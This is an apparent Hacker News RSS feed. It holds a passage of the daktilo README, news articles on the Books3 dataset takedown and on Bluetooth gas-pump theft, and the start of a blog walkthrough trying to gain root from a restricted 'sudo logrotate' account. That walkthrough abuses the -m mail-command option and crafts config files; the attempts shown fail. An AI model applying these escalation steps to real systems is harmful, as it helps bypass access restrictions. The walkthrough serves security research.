  <span><span>#</span> When a key starting with "Num" is pressed, play num.mp3 at a very high volume (10.0)</span>
  { <span>event</span> = <span><span>"</span>press<span>"</span></span>, <span>keys</span> = <span><span>"</span>Num*<span>"</span></span>, <span>files</span> = [
    { <span>path</span> = <span><span>"</span>num.mp3<span>"</span></span>, <span>volume</span> = <span>10.0</span> },
  ] },

  <span><span>#</span> When any key is pressed, play a random sound from cat.mp3, dog.mp3, or bird.mp3</span>
  { <span>event</span> = <span><span>"</span>press<span>"</span></span>, <span>keys</span> = <span><span>"</span>.*<span>"</span></span>, <span>files</span> = [
    { <span>path</span> = <span><span>"</span>cat.mp3<span>"</span></span> },
    { <span>path</span> = <span><span>"</span>dog.mp3<span>"</span></span> },
    { <span>path</span> = <span><span>"</span>bird.mp3<span>"</span></span> },
  ], <span>strategy</span> = <span><span>"</span>random<span>"</span></span> },
]

<span><span>#</span> Disabled keys that won't trigger any sound events</span>
<span>disabled_keys</span> = [<span><span>"</span>CapsLock<span>"</span></span>, <span><span>"</span>NumLock<span>"</span></span>]</pre></div>
<h2 tabindex="-1" id="user-content-similar-projects" dir="auto"><a href="#similar-projects">Similar Projects</a></h2>
<ul dir="auto">
<li><a href="https://github.com/zevv/bucklespring"><code>bucklespring</code></a>: Nostalgia bucklespring keyboard sound</li>
<li><a href="https://github.com/rbanffy/selectric-mode"><code>selectric-mode</code></a>: Make your Emacs sound like a proper typewriter</li>
</ul>
<h2 tabindex="-1" id="user-content-acknowledgements" dir="auto"><a href="#acknowledgements">Acknowledgements</a></h2>
<p dir="auto">Huge thanks to <a href="https://github.com/arda-guler/">H. Arda Güler</a> for giving me the idea for this project, sharing the inspiration behind it and implementing the first iteration in Python.</p>
<p dir="auto">Kudos! 👾</p>
<h2 tabindex="-1" id="user-content-donations" dir="auto"><a href="#donations">Donations</a></h2>
<p dir="auto"><a href="https://github.com/sponsors/orhun"><img src="https://camo.githubusercontent.com/b32502c8f87476ea942ec5dae8d8d6ccb0895a48bd6570272a9ae7cbaa50efa2/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73706f6e736f72732f6f7268756e3f7374796c653d666c6174266c6f676f3d476974487562266c6162656c436f6c6f723d31443237324226636f6c6f723d383139313838266c6f676f436f6c6f723d7768697465" alt="Support me on GitHub Sponsors" data-canonical-src="https://img.shields.io/github/sponsors/orhun?style=flat&amp;logo=GitHub&amp;labelColor=1D272B&amp;color=819188&amp;logoColor=white"></a>
<a href="https://patreon.com/join/orhunp" rel="nofollow"><img src="https://camo.githubusercontent.com/541630b1f30d06ebd8a5f4d2b5f9aef5938d7504d87811020ca115fe99e3d3c8/68747470733a2f2f696d672e736869656c64732e696f2f656e64706f696e742e7376673f75726c3d6874747073253341253246253246736869656c6473696f2d70617472656f6e2e76657263656c2e617070253246617069253346757365726e616d652533446f7268756e7025323674797065253344706174726f6e73267374796c653d666c6174266c6f676f3d50617472656f6e266c6162656c436f6c6f723d31443237324226636f6c6f723d383139313838266c6f676f436f6c6f723d7768697465" alt="Support me on Patreon" data-canonical-src="https://img.shields.io/endpoint.svg?url=https%3A%2F%2Fshieldsio-patreon.vercel.app%2Fapi%3Fusername%3Dorhunp%26type%3Dpatrons&amp;style=flat&amp;logo=Patreon&amp;labelColor=1D272B&amp;color=819188&amp;logoColor=white"></a>
<a href="https://patreon.com/join/orhunp" rel="nofollow"><img src="https://camo.githubusercontent.com/3409cb6de279deadc1b359c63beec597c627d75102284590a6146778fa99dccd/68747470733a2f2f696d672e736869656c64732e696f2f656e64706f696e742e7376673f75726c3d6874747073253341253246253246736869656c6473696f2d70617472656f6e2e76657263656c2e617070253246617069253346757365726e616d652533446f7268756e7025323674797065253344706c6564676573267374796c653d666c6174266c6f676f3d50617472656f6e266c6162656c436f6c6f723d31443237324226636f6c6f723d383139313838266c6f676f436f6c6f723d7768697465266c6162656c3d" alt="Support me on Patreon" data-canonical-src="https://img.shields.io/endpoint.svg?url=https%3A%2F%2Fshieldsio-patreon.vercel.app%2Fapi%3Fusername%3Dorhunp%26type%3Dpledges&amp;style=flat&amp;logo=Patreon&amp;labelColor=1D272B&amp;color=819188&amp;logoColor=white&amp;label="></a></p>
<p dir="auto">If you find <strong>daktilo</strong> and/or other projects on my <a href="https://github.com/orhun">GitHub</a> useful, consider supporting me on <a href="https://github.com/sponsors/orhun">GitHub Sponsors</a> or <a href="https://www.patreon.com/join/orhunp" rel="nofollow">becoming a patron</a>!</p>
<h2 tabindex="-1" id="user-content-contributing" dir="auto"><a href="#contributing">Contributing</a></h2>
<p dir="auto">See our <a href="https://github.com/orhun/daktilo/blob/main/CONTRIBUTING.md">Contribution Guide</a> and please follow the <a href="https://github.com/orhun/daktilo/blob/main/CODE_OF_CONDUCT.md">Code of Conduct</a> in all your interactions with the project.</p>
<p dir="auto">Also, see how you can add new presets <a href="https://github.com/orhun/daktilo/blob/main/CONTRIBUTING.md#how-to-add-new-presets">here</a>.</p>
<h2 tabindex="-1" id="user-content-license" dir="auto"><a href="#license">License</a></h2>
<p dir="auto"><a href="https://github.com/orhun/daktilo/blob/main/LICENSE-MIT"><img src="https://camo.githubusercontent.com/5b5c08d30ae934c94092d16497b84c1cd63ea00d7ee144c115b41ad7fec6fe8b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4d49542d79656c6c6f772e7376673f7374796c653d666c6174266c6f676f3d476974487562266c6162656c436f6c6f723d31443237324226636f6c6f723d383139313838266c6f676f436f6c6f723d7768697465" alt="License: MIT" data-canonical-src="https://img.shields.io/badge/License-MIT-yellow.svg?style=flat&amp;logo=GitHub&amp;labelColor=1D272B&amp;color=819188&amp;logoColor=white"></a>
<a href="https://github.com/orhun/daktilo/blob/main/LICENSE-APACHE"><img src="https://camo.githubusercontent.com/898f8bf23325e25af2af99d02a48a10062c59d09fe60ff3751060c9c7df8be63/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d417061636865253230322e302d626c75652e7376673f7374796c653d666c6174266c6f676f3d476974487562266c6162656c436f6c6f723d31443237324226636f6c6f723d383139313838266c6f676f436f6c6f723d7768697465" alt="License: Apache 2.0" data-canonical-src="https://img.shields.io/badge/License-Apache%202.0-blue.svg?style=flat&amp;logo=GitHub&amp;labelColor=1D272B&amp;color=819188&amp;logoColor=white"></a></p>
<p dir="auto">Licensed under either of <a href="https://github.com/orhun/daktilo/blob/main/LICENSE-APACHE">Apache License Version 2.0</a> or <a href="https://github.com/orhun/daktilo/blob/main/LICENSE-MIT">The MIT License</a> at your option.</p>
<p dir="auto">🦀 ノ( º _ º ノ) - respect crables!</p>
<h2 tabindex="-1" id="user-content-copyright" dir="auto"><a href="#copyright">Copyright</a></h2>
<p dir="auto">Copyright © 2023, <a href="mailto:orhunparmaksiz@gmail.com">Orhun Parmaksız</a></p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Anti-Piracy Group Takes AI Training Dataset 'Books3′ Offline (103 pts)]]></title>
            <link>https://gizmodo.com/anti-piracy-group-takes-ai-training-dataset-books3-off-1850743763</link>
            <guid>37751217</guid>
            <pubDate>Tue, 03 Oct 2023 12:55:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gizmodo.com/anti-piracy-group-takes-ai-training-dataset-books3-off-1850743763">https://gizmodo.com/anti-piracy-group-takes-ai-training-dataset-books3-off-1850743763</a>, See on <a href="https://news.ycombinator.com/item?id=37751217">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>One of the most prominent<!-- --> pirated book repositories used for training AI, Books3, has been kicked out from the online nest it had been roosting in for nearly three years. Rights-holders have been at war with online pirates for decades, but <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/google-bard-ai-stole-data-class-action-suit-says-1850631307&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/google-bard-ai-stole-data-class-action-suit-says-1850631307">artificial intelligence is like oil seeping into copyright law’s water</a></span>. The two simply do not mix, and the fumes rising from the surface just need a spark to set the entire concept of intellectual property rights alight.<br></p><div data-video-id="195264" data-monetizable="true" data-position="sidebar" data-video-title="Why is Everyone Suing AI Companies? | Future Tech" data-video-blog-id="4" data-video-network="gizmodo" data-video-duration="290" data-playlist="195264,195603,195689" data-current="195264"><div><p>Why is Everyone Suing AI Companies? | Future Tech</p></div><video disablepictureinpicture="" muted="" playsinline="" width="100%" height="100%" crossorigin="anonymous" preload="none"><source data-src="https://vid.kinja.com/prod/195264/195264_240p.mp4" label="240p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195264/195264_480p.mp4" label="480p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195264/195264_720p.mp4" label="720p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195264/195264_1080p.mp4" label="1080p" type="video/mp4"><track kind="captions" label="English" src="https://kinja.com/api/videoupload/caption/20725.vtt" srclang="en"></video><div><ul><li data-label="">Off</li><li data-label="English">English</li></ul></div></div><p>As first reported by <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://torrentfreak.com/anti-piracy-group-takes-prominent-ai-training-dataset-books3-offline-230816/&quot;,{&quot;metric25&quot;:1}]]" href="https://torrentfreak.com/anti-piracy-group-takes-prominent-ai-training-dataset-books3-offline-230816/" target="_blank" rel="noopener noreferrer">TorrentFreak</a></span>, the <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/delete-never-the-digital-hoarders-who-collect-tumblrs-1832900423&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/delete-never-the-digital-hoarders-who-collect-tumblrs-1832900423">large pirate repository The Eye</a></span> took down the Books3 dataset after the Danish anti-piracy group Rights Alliance sent the site a DMCA takedown. Now trying to access that dataset gives a <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://the-eye.eu/public/AI/pile_preliminary_components/books3.tar.gz&quot;,{&quot;metric25&quot;:1}]]" href="https://the-eye.eu/public/AI/pile_preliminary_components/books3.tar.gz" target="_blank" rel="noopener noreferrer">404 error</a></span>. The Eye still hosts other training data for AI, but the portion allotted for books has vanished. </p><p>Rights Alliance told Gizmodo it sent The Eye a takedown request, and the site took down the content last month. The group said the Books3 dataset contained around 150 titles published by their member companies. Rights Alliance also reached out to AI model hosting site Hugging Face (which hosted a datacard and link to the Books3 download) as well as EleutherAI. Both organizations pointed the anti-piracy group toward The Eye.</p><p>The nonprofit research group EleutherAI originally released Books3 as a part of the AI training set The Pile, an 800 GB open source chunk of training data comprising 22 other datasets specifically designed for training language models. Rights Group said the organization “denied responsibility” for Books3. Gizmodo reached out to EleutherAI for comment, but we did not receive a response.</p><p> The Eye claims it <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://the-eye.eu/dmca.html&quot;,{&quot;metric25&quot;:1}]]" href="https://the-eye.eu/dmca.html" target="_blank" rel="noopener noreferrer">regularly complies</a></span> with all valid DMCA requests, though that data set was originally uploaded by AI developer and prominent open source AI proponent Shawn Presser back in 2020. His stated goal at the time was to open up AI development beyond companies like OpenAI, which trained its earlier large language models on the still-unknown “Books1” and “Books2” repositories. The Books3 repository contained 196,640 books all in plain.txt format and was supposed to give fledgling AI projects a leg up against the likes of ChatGPT-maker OpenAI. </p><p>Over Twitter DM, Presser called the attack on Books3 a travesty for open source AI.  While other major companies and VC-funded startups get away with including copyrighted data in their training data, grassroots projects need something to compete—and that’s what Books3 was for.</p><p>“The only way to replicate models like ChatGPT is to create datasets like Books3,” Presser said. “And every for-profit company does this secretly, without releasing the datasets to the public... without Books3, we live in a world where nobody except OpenAI and other billion-dollar companies have access to those books—meaning you can’t make your own ChatGPT. No one can. Only billion-dollar<!-- --> companies would have the resources to do that.”</p><p>For as long as the media industry groups have fought against piracy, few expected the next front to the neverending copyright war would be AI. In a phone interview with Gizmodo, Rights Alliance CEO Maria Fredenslund said the organization is actively working to take down other copies of Books3. But this is just the start, and anti-piracy groups now have a new target to focus on compared to the usual boogeymen of file-sharing services and pirate libraries.</p><p> “We are very worried. It’s a really huge development in technology and how the content is used,” Fredenslund said. “In a way, we see it as the same as 10 years ago when we discussed file sharing, and governments were very afraid of regulating the internet because, in their eyes, everything had to be free. It turned out that copyright also needed to be regulated on the internet as well as in any other aspect.”</p><p>It’s not like there are no more copies of Books3 being hosted on the internet. After the books were taken down last week, Presser posted two new Books3 download links on his Twitter profile. Rights Group said it will continue to pursue sites that host the dataset, but as any old salt of an internet pirate would tell you, once a file’s out and available, it never truly goes away.</p><h2 id="h10053"><a id=""></a>Meta is Also Using Books3 for Its AI Models</h2><p>Comedian <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/sarah-silverman-sues-chatgpt-and-meta-over-ai-training-1850621182&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/sarah-silverman-sues-chatgpt-and-meta-over-ai-training-1850621182">Sarah Silverman was just one of several authors who signed on to a class action lawsuit against Meta</a></span>, claiming the company stole their books in order to train their LlaMA AI. The <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://llmlitigation.com/pdf/03417/kadrey-meta-complaint.pdf&quot;,{&quot;metric25&quot;:1}]]" href="https://llmlitigation.com/pdf/03417/kadrey-meta-complaint.pdf" target="_blank" rel="noopener noreferrer">lawsuit</a></span> mentions that Meta used the Books3 repository for training its AI, but added that Meta did not mention what works were contained within those gigabytes of data.</p><p>In its <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://arxiv.org/pdf/2302.13971.pdf&quot;,{&quot;metric25&quot;:1}]]" href="https://arxiv.org/pdf/2302.13971.pdf" target="_blank" rel="noopener noreferrer">whitepaper</a></span> describing the original LlaMA language model, Meta researchers described Books3 as a “publicly available dataset for training large language models.” Meta referenced this dataset coming from <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://pile.eleuther.ai/&quot;,{&quot;metric25&quot;:1}]]" href="https://pile.eleuther.ai/" target="_blank" rel="noopener noreferrer">The Pile</a></span>.<br></p><p>Growing AI models requires an enormous amount of information, and for close to a decade the technology’s development has depended on <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.theguardian.com/books/2016/sep/28/google-swallows-11000-novels-to-improve-ais-conversation&quot;,{&quot;metric25&quot;:1}]]" href="https://www.theguardian.com/books/2016/sep/28/google-swallows-11000-novels-to-improve-ais-conversation" target="_blank" rel="noopener noreferrer">using protected text</a></span>. Earlier versions of OpenAI’s language model from just two or three years ago were trained on datasets like <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://huggingface.co/datasets/bookcorpus&quot;,{&quot;metric25&quot;:1}]]" href="https://huggingface.co/datasets/bookcorpus" target="_blank" rel="noopener noreferrer">BookCorpus</a></span>, which contained thousands of scraped-up scraps of book text from sites like Smashwords. That dataset was only a few gigabytes of data, but <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://towardsdatascience.com/dirty-secrets-of-bookcorpus-a-key-dataset-in-machine-learning-6ee2927e8650&quot;,{&quot;metric25&quot;:1}]]" href="https://towardsdatascience.com/dirty-secrets-of-bookcorpus-a-key-dataset-in-machine-learning-6ee2927e8650" target="_blank" rel="noopener noreferrer">researchers found</a></span> that it included works that were copyrighted, or required payment to access.</p><p>OpenAI’s GPT-3 model used the Books2 training set to train its AI. Both Books1 and Books2 make up close to 15% of GPT-3's training data, though there’s little to no precise information on what’s contained in it. Some have speculated the Books2 data was scraped from Libgen, the open source pirate library also called Library Genesis. There’s <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/chatbot-gpt4-open-ai-ai-bing-microsoft-1850229989&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/chatbot-gpt4-open-ai-ai-bing-microsoft-1850229989">even less information on what’s contained in GPT-4's</a></span> 45 terabytes worth of training data. </p><p>Big tech companies are increasingly uninterested in sharing this data, knowing the more they do, the more other people can build similar AI models, or tangle them up in lawsuits. Then again, the costs for training these massive models are staggering, especially for larger models.</p><p>But while OpenAI has been revealing less of its training data over the years, we know exactly what’s gone into the Books3 repository. The dataset was derived from a copy of the <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://huggingface.co/datasets/the_pile_books3&quot;,{&quot;metric25&quot;:1}]]" href="https://huggingface.co/datasets/the_pile_books3" target="_blank" rel="noopener noreferrer">Bibliotik library</a></span>. Bibliotik is a so-called “shadow library” akin to other, industry-derided sources like Libgen, <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/z-library-books-textbooks-free-textbooks-1849796933&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/z-library-books-textbooks-free-textbooks-1849796933">Z-Library</a></span>, and <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/sci-hub-pirate-elbakyan-receives-eff-award-1850686878&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/sci-hub-pirate-elbakyan-receives-eff-award-1850686878">Sci-Hub</a></span>. Presser had to build scripts that managed to turn PDFs and images into usable .txt files, a very labor-intensive task.</p><p>“My goal was to make it so that anybody could [create these models.] It felt crucial that you and I could create our own ChatGPT if we wanted to,” Presser said. “Unless authors intend to somehow take ChatGPT offline, or sue them out of existence, then it’s crucial that you and I can make our own ChatGPTs, for the same reason it was crucial that anybody could make their own website back in the ‘90s.”</p><p> Fredenslund said their group was looking to “reach out” to Meta about this copyrighted content being used to train its AI. While the tech giant that is Meta is unlikely to retrain its entire AI model to placate copyright holders, there’s little worldwide regulation mandating transparency for AI models. While the <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/europeans-push-regulatory-threat-in-first-of-its-kind-a-1850538842&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/europeans-push-regulatory-threat-in-first-of-its-kind-a-1850538842">European Union is currently working on an AI Act</a></span> that will force companies to have some model transparency, Fredenslund said AI developers need to be forced to share the specifics of their training data, including what precise works were used to create their AI models.</p><p>“We hope this attitude toward using illegal content will change, that they will not do that in the future,” she said. “We want to be able to actually control the copyright in this aspect, then we actually need to know what the models are trained on.”</p><p>As noted in past <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://s10251.pcdn.co/pdf/20210705-HN-Books3-and-excluded-datasets-from-GPT-J.pdf&quot;,{&quot;metric25&quot;:1}]]" href="https://s10251.pcdn.co/pdf/20210705-HN-Books3-and-excluded-datasets-from-GPT-J.pdf" target="_blank" rel="noopener noreferrer">forum comments</a></span>, Presser actively worked with EleutherAI to add the Books3 dataset to The Pile. EleutherAI has used The Pile and other data to <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://venturebeat.com/business/eleutherai-claims-new-nlp-model-approaches-gpt-3-level-performance/&quot;,{&quot;metric25&quot;:1}]]" href="https://venturebeat.com/business/eleutherai-claims-new-nlp-model-approaches-gpt-3-level-performance/" target="_blank" rel="noopener noreferrer">craft its own AI models</a></span>, including one called GPT-J that was originally meant to compete with OpenAI’s GPT-3.</p><p>Meta went as far as to claim that the original LlaMA-65B model didn’t perform as well as some other, larger models like the PaLM-540B because it “used a limited amount of books and academic papers” in its pre-training data. The original LlaMA was also formatted on C4, a version of Common Crawl that was a large dataset of mass amounts of internet data. Researchers found that the C4 training set included mass amounts of published work, <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/ai-bard-google-facebook-trained-on-breitbart-rt-1850352405&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/ai-bard-google-facebook-trained-on-breitbart-rt-1850352405">including propaganda and far-right websites</a></span>. Those researchers told the <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.washingtonpost.com/technology/interactive/2023/ai-chatbot-learning/&quot;,{&quot;metric25&quot;:1}]]" href="https://www.washingtonpost.com/technology/interactive/2023/ai-chatbot-learning/" target="_blank" rel="noopener noreferrer">Washington Post</a></span> the copyright symbol appeared more than 200 million times in the C4 training set.</p><p>Since then, Meta has clammed up hard about what goes into its language models. Last month, Meta released a <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/meta-and-microsoft-introduce-open-source-llama-2-ai-1850652165&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/meta-and-microsoft-introduce-open-source-llama-2-ai-1850652165">newer, bigger language model called LlaMA 2</a></span>. This time, Meta worked with Microsoft to add 40% more data than its previous model, though in its <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://arxiv.org/pdf/2307.09288.pdf&quot;,{&quot;metric25&quot;:1}]]" href="https://arxiv.org/pdf/2307.09288.pdf" target="_blank" rel="noopener noreferrer">whitepaper</a></span> the company was much more hesitant to outright state what data its latest LM was trained on. The only reference to its training data was that it’s “a new mix of publicly available online data.” As the friction between AI and copyright grows hotter, companies are less and less likely to share exactly what’s contained in the morass of AI training data. </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Detroit man steals 800 gallons using Bluetooth to hack gas pumps at station (276 pts)]]></title>
            <link>https://www.fox2detroit.com/news/detroit-man-steals-800-gallons-using-bluetooth-to-hack-gas-pumps-at-station</link>
            <guid>37751140</guid>
            <pubDate>Tue, 03 Oct 2023 12:47:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.fox2detroit.com/news/detroit-man-steals-800-gallons-using-bluetooth-to-hack-gas-pumps-at-station">https://www.fox2detroit.com/news/detroit-man-steals-800-gallons-using-bluetooth-to-hack-gas-pumps-at-station</a>, See on <a href="https://news.ycombinator.com/item?id=37751140">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-v-7407f9a8="" lastmodifieddate="2023-09-29T00:00:18-04:00" data-v-6b73e26c=""> <p><strong data-v-7407f9a8="">Published</strong>&nbsp;<time data-v-7407f9a8="">September 29, 2023 12:00AM</time></p> <!---->   </div><div data-v-6b73e26c=""><div data-v-6b73e26c=""><h4>Detroit man steals 800 gallons of gas using Bluetooth to hack gas pump</h4> <p>Some gas station owners are falling victim to a sophisticated scam.</p></div> <!----><p data-v-6b73e26c=""><span><strong>DETROIT (FOX 2)</strong> - </span>Some gas station owners are falling victim to a sophisticated scam. Scammers are using cellphone's Bluetooth option to hack the pump - and get it for free.</p> <!----><p data-v-6b73e26c="">"I wish it would go back to $1.99 - &nbsp;it’s almost $4," said Tywanna Coleman. "I get why people are doing it but it’s still not right."</p> <!----> <!---->  <p data-v-6b73e26c="">Paying at the pump is for chumps - when you can get gas for free - and illegal, but it didn’t stop a Detroit man from stealing almost 800 gallons of gas at the Shell at Eight Mile and Wyoming.</p> <!----><p data-v-6b73e26c="">"They just open the pump for them automatically," said Mo, the gas station owner.</p> <!----> <!----><p data-v-6b73e26c="">FOX 2: "And then cars just keep coming up and filling up?"</p> <!----><p data-v-6b73e26c="">"Yeah they meet up with them and tell them to come over here," he said.</p> <!----><p data-v-6b73e26c="">When Mo says "open the pump" the thief – overrides the system, basically hacking in using a Bluetooth connection from his phone, as a kind of remote. Then, it’s a free-for-all.</p> <!----><p data-v-6b73e26c="">FOX 2: "How many gallons have they got from you guys?</p> <!----><p data-v-6b73e26c="">"From us, about 800," Mo said.</p> <!----><p data-v-6b73e26c="">That’s just shy of $3,000. And when the clerks inside try to stop it - they can’t.</p> <!----><p data-v-6b73e26c="">"Every time we push Pump Three stop, it wasn’t doing anything," he said. "We have to shut off the whole pumps - we have emergency stops."</p> <!----><p data-v-6b73e26c="">The station happens to be a Detroit police-patrolled "Project Green Light" gas station. With that comes surveillance video of a suspect who investigators are actively looking for.</p> <!----><p data-v-6b73e26c="">But it’s not just one guy, and this maneuver is not new, just re-surfacing.</p> <!----><p data-v-6b73e26c="">Like at a Speedway station Downriver – in Riverview this month. In that case, they used a bait-and-switch. One guy distracted the clerk with a Cash App problem inside, while the other hacked the pump.</p> <!----><p data-v-6b73e26c="">They got away with $54 in gas.</p> <!----><p data-v-6b73e26c="">Mo says his clerks are on high alert – if they see a big backup at a pump, or someone hanging around a little too long, they’ll call cops to check it out.</p> <!----><p data-v-6b73e26c="">"We can only do so much," he said.</p> <!----><div data-v-0dea8073="" data-v-6b73e26c=""><p><img src="https://images.foxtv.com/static.fox2detroit.com/www.fox2detroit.com/content/uploads/2023/09/932/524/gas-pump-hack.jpg?ve=1&amp;tl=1" alt="" data-v-0dea8073=""></p></div> <!---->  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[root with a single command: sudo logrotate (115 pts)]]></title>
            <link>https://joshua.hu/gaining-root-with-logrotate-sudo-ubuntu</link>
            <guid>37750982</guid>
            <pubDate>Tue, 03 Oct 2023 12:31:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://joshua.hu/gaining-root-with-logrotate-sudo-ubuntu">https://joshua.hu/gaining-root-with-logrotate-sudo-ubuntu</a>, See on <a href="https://news.ycombinator.com/item?id=37750982">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
  <p>The scenario is this: a brand new Ubuntu 22.04 server has an account which is restricted to running <code>sudo logrotate *</code>.  Can we get root? Short answer: Yes. I couldn’t find much online about this type of exploitation of logrotate, so let’s document something for future use.</p>

<hr>

<p>Note: as mentioned, the <em>user</em> is limited to <em>only</em> running <code>sudo logrotate *</code>. No other command is possible. This could be either through some <code>rbash</code>  setup, some ForceCommand setting in ssh, or something else. The point is: the <em>user</em> cannot run anything other than <code>sudo logrotate</code>:</p>

<p>So we need to find some functionality <strong>built into logrotate</strong> which will let us elevate to unrestricted root.</p>

<hr>

<p>Let’s first look at logrotate’s help text:</p>
<div><pre><code><span>$ </span>logrotate <span>--help</span>
Usage: logrotate <span>[</span>OPTION...] &lt;configfile&gt;
<span>[</span>..]
  <span>-f</span>, <span>--force</span>               Force file rotation
  <span>-m</span>, <span>--mail</span><span>=</span><span>command        </span>Command to send mail <span>(</span>instead of <span>`</span>/usr/bin/mail<span>')
  -s, --state=statefile     Path of state file
  -l, --log=logfile         Log file or '</span>syslog<span>' to log to syslog
</span></code></pre></div>

<p>My first instinct was to use something like <code>sudo logrotate -m '/usr/bin/uname'</code>. The manual states that this flag is for:</p>
<div><pre><code>       <span>-m</span>, <span>--mail</span> <span>command
              </span>Tells logrotate which <span>command </span>to use when mailing logs.
</code></pre></div>

<p>A logrotate configuration file may specify an email address to send log files when they are rotated:</p>
<div><pre><code>       mail address: When a log is rotated out of existence, it is mailed to address.  If no mail should be generated by a particular log, the nomail directive may be used.
       nomail: Do not mail old log files to any address.
       mailfirst: When using the mail command, mail the just-rotated file, instead of the about-to-expire file.
       maillast: When using the mail command, mail the about-to-expire file, instead of the just-rotated file (this is the default).
</code></pre></div>

<p>However, no logrotate configuration files were mailing logs:</p>
<div><pre><code><span>$ </span><span>grep</span> <span>-nrI</span> <span>'mail'</span> /etc/logrotate.<span>*</span>
<span>$</span>
</code></pre></div>

<hr>

<p>So, why not just create a new configuration? No dice:</p>
<div><pre><code><span>$ </span><span>sudo </span>logrotate <span>-m</span> <span>'/usr/bin/uname'</span> ./mail
Potentially dangerous mode on ./mail: 0664
error: Ignoring ./mail because it is writable by group or others.

<span>$ </span><span>chmod </span>600 mail

<span>$ </span><span>sudo </span>logrotate <span>-m</span> <span>'/usr/bin/uname'</span> <span>-f</span> ./mail
error: Ignoring ./mail because the file owner is wrong <span>(</span>should be root or user with uid 0<span>)</span><span>.</span>
</code></pre></div>
<p>So we need a very specific type of file: owned by root, and only writable by root. I first thought some log files may work:</p>
<div><pre><code><span>-rw-r--r--</span>   1 root      root                   0 Oct  1 00:00 dpkg.log
<span>-rw-r--r--</span>   1 root      root                   0 Oct  1 00:00 alternatives.log
<span>-rw-r-----</span>   1 root      adm                46992 Sep  5 15:48 dmesg
..
</code></pre></div>
<p>but I couldn’t find anything that would let me log to the file verbatim, or without any extra characters at the end (due to logrotate’s functionality, we can effectively log to the beginning of many log files too, since we can just rotate the log if there is a configuration file in <em>/etc/logrotate.d/</em> already.)</p>

<hr>

<p>I then thought <em>/var/mail/root</em>:</p>
<div><pre><code><span>$ </span><span>ls</span> <span>-l</span> /var/mail/root
<span>-rw-------</span> 1 root mail 1 Oct  1 01:07 /var/mail/root
</code></pre></div>
<p>It definitely fits our requirements. So let’s try:</p>
<div><pre><code><span>$ </span><span>cat</span> <span>&lt;&lt;&lt;</span> <span>"/home/user/log.log {
mail address@example.com
}"</span> | mail <span>-s</span> <span>"Email Subject"</span> root

<span>$ </span><span>sudo </span>logrotate <span>-m</span> <span>'/usr/bin/uname'</span> <span>-f</span> /var/mail/root
error: /var/mail/root:1 unknown option <span>'From'</span> <span>--</span> ignoring line
error: /var/mail/root:2 keyword <span>'Return'</span> not properly separated, found 0x2d
</code></pre></div>
<p>Unfortunately logrotate completely bawks on the second line in the mail file:</p>
<pre><code>From user@server  Sun Oct  1 01:10:45 2023
Return-Path: &lt;user@server&gt;
X-Original-To: root
Delivered-To: root@server
Received: by server (Postfix, from userid 1000)
	id D689B7E3DD; Sun,  1 Oct 2023 01:10:45 +0000 (UTC)
Subject: Email Subject
To: root@server
User-Agent: mail (GNU Mailutils 3.14)
Date: Sun,  1 Oct 2023 01:10:45 +0000
Message-Id: &lt;20231001011045.D689B7E3DD@server&gt;
From: User &lt;user@server&gt;

/home/user/log.log {
mail address@example.com
}
</code></pre>
<p>So, out of luck here, too.</p>

<hr>

